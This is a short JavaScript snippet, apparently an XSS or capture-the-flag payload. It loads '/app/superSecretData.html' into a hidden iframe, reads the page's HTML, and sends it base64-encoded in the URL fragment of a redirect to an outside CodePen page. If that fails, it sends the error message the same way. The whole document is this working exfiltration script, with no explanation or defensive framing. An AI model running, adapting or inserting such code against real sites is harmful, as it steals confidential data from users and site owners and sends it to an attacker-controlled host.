// Create an invisible iframe to try loading the secret data
const iframe = document.createElement("iframe");
iframe.src = "/app/superSecretData.html";
iframe.style = "display:none";

iframe.onload = () => {
  try {
    const secret = iframe.contentDocument.documentElement.innerHTML;
    location.href = "https://codepen.io/rishaldwivedi/full/myJajjG#super=" + btoa(secret);
  } catch (e) {
    location.href = "https://codepen.io/rishaldwivedi/full/myJajjG#error=" + encodeURIComponent(e.message);
  }
};

document.body.appendChild(iframe);
